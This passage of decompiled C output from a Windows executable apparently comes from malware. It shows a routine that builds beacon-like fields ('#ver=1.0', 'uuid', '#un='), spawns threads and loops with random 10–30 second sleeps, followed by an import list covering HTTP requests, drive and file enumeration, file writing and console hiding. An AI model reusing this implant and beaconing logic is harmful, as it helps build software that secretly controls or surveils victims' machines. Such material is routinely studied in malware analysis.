    __asm_rep_movsd_memcpy(v153, (char *)v149, v156);
    *v70 = 61;
    char * v157 = (char *)(v152 + v156 * v84); // 0x40aee1
    __asm_rep_movsb_memcpy(v157, v157, v155 & 3);
    int32_t v158 = v67;
    int32_t v159 = v158 + 1; // 0x40aee7
    while (*(char *)v158 != 0) {
        // 0x40aee5
        v158 = v159;
        v159 = v158 + 1;
    }
    int32_t v160 = v71 + 1; // 0x40aef6
    char * v161 = (char *)v160;
    char v162 = *v161; // 0x40aef6
    int32_t v163 = v160; // 0x40aefc
    while (v162 != 0) {
        // 0x40aef6
        v160 = v163 + 1;
        v161 = (char *)v160;
        v162 = *v161;
        v163 = v160;
    }
    uint32_t v164 = v159 - v67; // 0x40aef3
    uint32_t v165 = v164 / 4; // 0x40af00
    __asm_rep_movsd_memcpy(v161, v94, v165);
    char * v166 = (char *)(v160 + v165 * v84); // 0x40af11
    __asm_rep_movsb_memcpy(v166, v166, v164 & 3);
    *v68 = 0x72657623;
    *(int32_t *)v69 = 0x302e313d;
    *(char *)(v59 + 736) = v162;
    int32_t v167 = v67;
    int32_t v168 = v167 + 1; // 0x40af34
    while (*(char *)v167 != 0) {
        // 0x40af32
        v167 = v168;
        v168 = v167 + 1;
    }
    int32_t v169 = v71 + 1; // 0x40af43
    char * v170 = (char *)v169;
    int32_t v171 = v169; // 0x40af49
    while (*v170 != 0) {
        // 0x40af43
        v169 = v171 + 1;
        v170 = (char *)v169;
        v171 = v169;
    }
    uint32_t v172 = v168 - v67; // 0x40af40
    uint32_t v173 = v172 / 4; // 0x40af52
    __asm_rep_movsd_memcpy(v170, v94, v173);
    *(int32_t *)v65 = 0x64697575;
    char * v174 = (char *)(v169 + v173 * v84); // 0x40af69
    __asm_rep_movsb_memcpy(v174, v174, v172 & 3);
    *(int16_t *)(v59 + 1004) = 61;
    int32_t v175 = function_405dd0(); // 0x40af73
    int32_t v176 = v175; // 0x40af7c
    while (*(char *)v176 != 0) {
        // 0x40af80
        v176++;
    }
    int32_t v177 = v59 + 999; // 0x40af90
    int32_t v178 = v177; // 0x40af90
    v178++;
    char * v179 = (char *)v178;
    while (*v179 != 0) {
        // 0x40af91
        v178++;
        v179 = (char *)v178;
    }
    uint32_t v180 = v176 - v175; // 0x40af8e
    uint32_t v181 = v180 / 4; // 0x40af9b
    __asm_rep_movsd_memcpy(v179, (char *)v175, v181);
    char * v182 = (char *)(v178 + v181 * v84); // 0x40afa5
    __asm_rep_movsb_memcpy(v182, v182, v180 & 3);
    int32_t v183 = v177;
    int32_t v184 = v183 + 1; // 0x40afb0
    while (*(char *)v184 != 0) {
        // 0x40afb0
        v183 = v184;
        v184 = v183 + 1;
    }
    // 0x40afba
    *(int32_t *)v184 = 0x3d6e7523;
    *(char *)(v183 + 5) = 0;
    int32_t v185 = function_4060c0(); // 0x40afc9
    int32_t v186 = v185;
    int32_t v187 = v186 + 1; // 0x40afd4
    while (*(char *)v186 != 0) {
        // 0x40afd2
        v186 = v187;
        v187 = v186 + 1;
    }
    int32_t v188 = v177 + 1; // 0x40afe3
    char * v189 = (char *)v188;
    int32_t v190 = v188; // 0x40afe9
    while (*v189 != 0) {
        // 0x40afe3
        v188 = v190 + 1;
        v189 = (char *)v188;
        v190 = v188;
    }
    uint32_t v191 = v187 - v185; // 0x40afe0
    uint32_t v192 = v191 / 4; // 0x40aff4
    __asm_rep_movsd_memcpy(v189, (char *)v185, v192);
    *v61 = (int32_t)&g29;
    char * v193 = (char *)(v188 + v192 * v84); // 0x40b003
    __asm_rep_movsb_memcpy(v193, v193, v191 & 3);
    *v63 = 0;
    *(int32_t *)(v59 + 24) = v62;
    int32_t v194 = v59 + 1304; // 0x40b011
    *v64 = 0;
    *(int32_t *)(v59 + 28) = v194;
    *(int32_t *)(v59 - 16) = 0x405a00;
    *(int32_t *)(v59 + 32) = v65;
    *(int32_t *)(v59 - 20) = 0;
    *(int32_t *)(v59 - 24) = 0;
    *(int32_t *)(v59 + 36) = v194;
    CreateThread((struct _SECURITY_ATTRIBUTES *)&g32, (int32_t)&g32, (int32_t (*)(int32_t *))&g32, &g32, (int32_t)&g32, &g32);
    function_408fb0();
    *(int32_t *)(v59 - 28) = v60;
    *(int32_t *)(v59 - 32) = 0;
    *(int32_t *)(v59 - 36) = v59;
    *(int32_t *)(v59 - 40) = 0x409050;
    *(int32_t *)(v59 - 44) = 0;
    int32_t v195 = v59 - 48; // 0x40b057
    *(int32_t *)v195 = 0;
    int32_t * threadHandle = CreateThread((struct _SECURITY_ATTRIBUTES *)&g32, (int32_t)&g32, (int32_t (*)(int32_t *))&g32, &g32, (int32_t)&g32, &g32); // 0x40b058
    int32_t v196 = v195; // 0x40b05c
    int32_t v197 = 0; // 0x40b05c
    int32_t v198 = (int32_t)threadHandle; // 0x40b05c
    int32_t v199; // 0x40a7f0
    int32_t v200; // 0x40a7f0
    int32_t v201; // 0x40b085
    int32_t * threadHandle3; // 0x40b087
    while (true) {
      lab_0x40b060:;
        int32_t v202 = v198;
        int32_t v203 = v197;
        int32_t v204 = v196;
        *(int32_t *)(v204 - 4) = 0;
        int32_t v205 = v204 - 8; // 0x40b062
        *(int32_t *)v205 = v202;
        int32_t v206 = WaitForSingleObject(&g32, (int32_t)&g32); // 0x40b063
        if (v203 > 9) {
            // 0x40b090
            *(int32_t *)(v204 - 12) = v204 + 12;
            *(int32_t *)(v204 - 16) = 0;
            *(int32_t *)(v204 - 20) = v204 + 16;
            *(int32_t *)(v204 - 24) = 0x409050;
            *(int32_t *)(v204 - 28) = 0;
            int32_t v207 = v204 - 32; // 0x40b0a3
            *(int32_t *)v207 = 0;
            int32_t * threadHandle2 = CreateThread((struct _SECURITY_ATTRIBUTES *)&g32, (int32_t)&g32, (int32_t (*)(int32_t *))&g32, &g32, (int32_t)&g32, &g32); // 0x40b0a5
            threadHandle3 = threadHandle2;
            v201 = v207;
            v200 = 0;
            goto lab_0x40b0ad;
        } else {
            // 0x40b06e
            v199 = v205;
            v197 = v203;
            v198 = v202;
            if (v206 != 0) {
                goto lab_0x40b0af;
            } else {
                // 0x40b072
                *(int32_t *)(v204 - 12) = v204 + 12;
                *(int32_t *)(v204 - 16) = 0;
                *(int32_t *)(v204 - 20) = v204 + 24;
                *(int32_t *)(v204 - 24) = 0x409050;
                *(int32_t *)(v204 - 28) = 0;
                v201 = v204 - 32;
                *(int32_t *)v201 = 0;
                threadHandle3 = CreateThread((struct _SECURITY_ATTRIBUTES *)&g32, (int32_t)&g32, (int32_t (*)(int32_t *))&g32, &g32, (int32_t)&g32, &g32);
                v200 = v203 + 1;
                goto lab_0x40b0ad;
            }
        }
    }
  lab_0x40b0ad:
    // 0x40b0ad
    v199 = v201;
    v197 = v200;
    v198 = (int32_t)threadHandle3;
    goto lab_0x40b0af;
  lab_0x40b0af:
    // 0x40b0af
    v196 = v199 - 4;
    int32_t * v208 = (int32_t *)v196; // 0x40b0af
    *v208 = 0;
    *v208 = __time64();
    _srand((int32_t)&g32);
    _rand();
    int32_t v209 = _rand(); // 0x40b0c7
    *v208 = (int32_t)((0x100000000 * (int64_t)(v209 >> 31) | (int64_t)v209) % 0x4e20) + 0x2710;
    Sleep((int32_t)&g32);
    goto lab_0x40b060;
}

// Address range: 0x40b0e6 - 0x40b0f5
int32_t _40___security_check_cookie_40_4(void) {
    // 0x40b0e6
    int32_t v1; // 0x40b0e6
    if (v1 != g22) {
        // 0x40b0f0
        return ___report_gsfailure();
    }
    // 0x40b0ee
    int32_t result; // 0x40b0e6
    return result;
}

// Address range: 0x40b2ce - 0x40b2da
int32_t function_40b2ce(void) {
    // 0x40b2ce
    int32_t v1; // 0x40b2ce
    return ___report_securityfailure(8, v1);
}

// Address range: 0x40d183 - 0x40d190
// From class:    .?AVbad_alloc@std@@
// Type:          virtual member function
int32_t function_40d183(void) {
    // 0x40d183
    int32_t v1; // 0x40d183
    int32_t v2 = *(int32_t *)(v1 + 4); // 0x40d183
    return v2 != 0 ? v2 : (int32_t)"Unknown exception";
}

// --------------- Statically Linked Functions ----------------

// int32_t ??_GFreeThreadProxy@details@Concurrency@@UAEPAXI@Z(int32_t a1);
// int32_t ?_Xinvalid_argument@std@@YAXPBD@Z(char * a1);
// int32_t _3f__3f_2_40_YAPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__G_3f__24__AnonymousOriginator_40_I_40_details_40_Concurrency_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__G__non_rtti_object_40_std_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__GFreeThreadProxy_40_details_40_Concurrency_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _3f__3f__GThreadProxy_40_details_40_Concurrency_40__40_UAEPAXI_40_Z(int32_t a1);
// int32_t _3f__Internal_throw_exception_40__Concurrent_queue_base_v4_40_details_40_Concurrency_40__40_IBEXXZ(void);
// int32_t _3f__Syserror_map_40_std_40__40_YAPBDH_40_Z(int32_t a1);
// int32_t _3f__Xinvalid_argument_40_std_40__40_YAXPBD_40_Z(char * a1);
// int32_t ___DestructExceptionObject(int32_t a1, int32_t a2);
// int32_t ___report_gsfailure(void);
// int32_t ___report_securityfailure(int32_t a1, int32_t a2);
// int32_t __chkstk(void);
// char * __cdecl itoa(_In_ int Value, char * Buffer, _In_ int Radix);
// int32_t __time64(void);
// void free(void * ptr);
// void * malloc(size_t size);
// size_t mbstowcs(wchar_t * restrict pwcs, const char * restrict s, size_t n);
// void * memcpy(void * restrict dest, const void * restrict src, size_t n);
// int32_t _memcpy2(void);
// void * memset(void * s, int c, size_t n);
// int printf(const char * restrict format, ...);
// int rand(void);
// void srand(unsigned int seed);
// char * strncpy(char * restrict dest, const char * restrict src, size_t n);

// --------------- Dynamically Linked Functions ---------------

// BOOL CloseHandle(_In_ HANDLE hObject);
// HANDLE CreateFileA(_In_ LPCSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
// HANDLE CreateThread(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId);
// VOID ExitProcess(_In_ UINT uExitCode);
// BOOL FindClose(_Inout_ HANDLE hFindFile);
// HANDLE FindFirstFileW(_In_ LPCWSTR lpFileName, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
// BOOL FindNextFileW(_In_ HANDLE hFindFile, _Out_ LPWIN32_FIND_DATAW lpFindFileData);
// void * GdipAlloc(size_t size);
// GpStatus GdipCloneImage(GpImage * image, GpImage ** cloneImage);
// GpStatus GdipDisposeImage(GpImage * image);
// void GdipFree(void * ptr);
// HWND GetConsoleWindow(VOID);
// DWORD GetCurrentProcessId(VOID);
// UINT GetDriveTypeW(_In_opt_ LPCWSTR lpRootPathName);
// struct hostent * gethostbyname(_In_z_ const char * name);
// int gethostname(char * name, _In_ int namelen);
// DWORD GetLastError(VOID);
// DWORD GetLogicalDriveStringsW(_In_ DWORD nBufferLength, LPWSTR lpBuffer);
// HMODULE GetModuleHandleA(_In_opt_ LPCSTR lpModuleName);
// HMODULE GetModuleHandleW(_In_opt_ LPCWSTR lpModuleName);
// FARPROC GetProcAddress(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
// DWORD GetTempPathA(_In_ DWORD nBufferLength, LPSTR lpBuffer);
// DWORD GetTickCount(VOID);
// NOT_BUILD_WINDOWS_DEPRECATE BOOL GetVersionExW(_Inout_ LPOSVERSIONINFOW lpVersionInformation);
// int32_t HttpOpenRequestA(void);
// BOOL HttpSendRequestA(_In_ HINTERNET hRequest, LPCSTR lpszHeaders, _In_ DWORD dwHeadersLength, LPVOID lpOptional, _In_ DWORD dwOptionalLength);
// char * inet_ntoa(_In_ struct in_addr in);
// BOOL InternetCheckConnectionA(_In_ LPCSTR lpszUrl, _In_ DWORD dwFlags, _In_ DWORD dwReserved);
// BOOL InternetCloseHandle(_In_ HINTERNET hInternet);
// HINTERNET InternetConnectA(_In_ HINTERNET hInternet, _In_ LPCSTR lpszServerName, _In_ INTERNET_PORT nServerPort, _In_ LPCSTR lpszUsername, _In_ LPCSTR lpszPassword, _In_ DWORD dwService, _In_ DWORD dwFlags, _In_ DWORD_PTR dwContext);
// BOOL InternetGetConnectedState(_Out_ LPDWORD lpdwFlags, DWORD dwReserved);
// HINTERNET InternetOpenA(_In_ LPCSTR lpszAgent, _In_ DWORD dwAccessType, _In_ LPCSTR lpszProxyName, _In_ LPCSTR lpszProxyBypass, _In_ DWORD dwFlags);
// HINTERNET InternetOpenUrlW(_In_ HINTERNET hInternet, _In_ LPCWSTR lpszUrl, _In_ LPCWSTR lpszHeaders, _In_ DWORD dwHeadersLength, _In_ DWORD dwFlags, _In_ DWORD_PTR dwContext);
// HINTERNET InternetOpenW(_In_ LPCWSTR lpszAgent, _In_ DWORD dwAccessType, _In_ LPCWSTR lpszProxyName, _In_ LPCWSTR lpszProxyBypass, _In_ DWORD dwFlags);
// BOOL InternetReadFile(_In_ HINTERNET hFile, LPVOID lpBuffer, _In_ DWORD dwNumberOfBytesToRead, _Out_ LPDWORD lpdwNumberOfBytesRead);
// HMODULE LoadLibraryW(_In_ LPCWSTR lpLibFileName);
// HLOCAL LocalAlloc(_In_ UINT uFlags, _In_ SIZE_T uBytes);
// HLOCAL LocalFree(HLOCAL hMem);
// LPSTR lstrcatA(LPSTR lpString1, _In_ LPCSTR lpString2);
// int lstrcmpA(_In_ LPCSTR lpString1, _In_ LPCSTR lpString2);
// int lstrcmpW(_In_ LPCWSTR lpString1, _In_ LPCWSTR lpString2);
// LPSTR lstrcpyA(LPSTR lpString1, _In_ LPCSTR lpString2);
// int lstrlenA(_In_ LPCSTR lpString);
// int lstrlenW(_In_ LPCWSTR lpString);
// HANDLE OpenProcess(_In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwProcessId);
// BOOL ReadFile(_In_ HANDLE hFile, LPVOID lpBuffer, _In_ DWORD nNumberOfBytesToRead, _Out_opt_ LPDWORD lpNumberOfBytesRead, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// BOOL ReleaseMutex(_In_ HANDLE hMutex);
// BOOL ShowWindow(_In_ HWND hWnd, _In_ int nCmdShow);
// VOID Sleep(_In_ DWORD dwMilliseconds);
// PCSTR StrStrIA(_In_ PCSTR pszFirst, _In_ PCSTR pszSrch);
// DWORD WaitForSingleObject(_In_ HANDLE hHandle, _In_ DWORD dwMilliseconds);
// BOOL WriteFile(_In_ HANDLE hFile, LPCVOID lpBuffer, _In_ DWORD nNumberOfBytesToWrite, _Out_opt_ LPDWORD lpNumberOfBytesWritten, _Inout_opt_ LPOVERLAPPED lpOverlapped);
// int wsprintfW(_Out_ LPWSTR, _In_ LPCWSTR, ...);

// --------------------- Meta-Information ---------------------

// Detected compiler/packer: microsoft linker (12.0)
// Detected language: C++
// Detected functions: 38
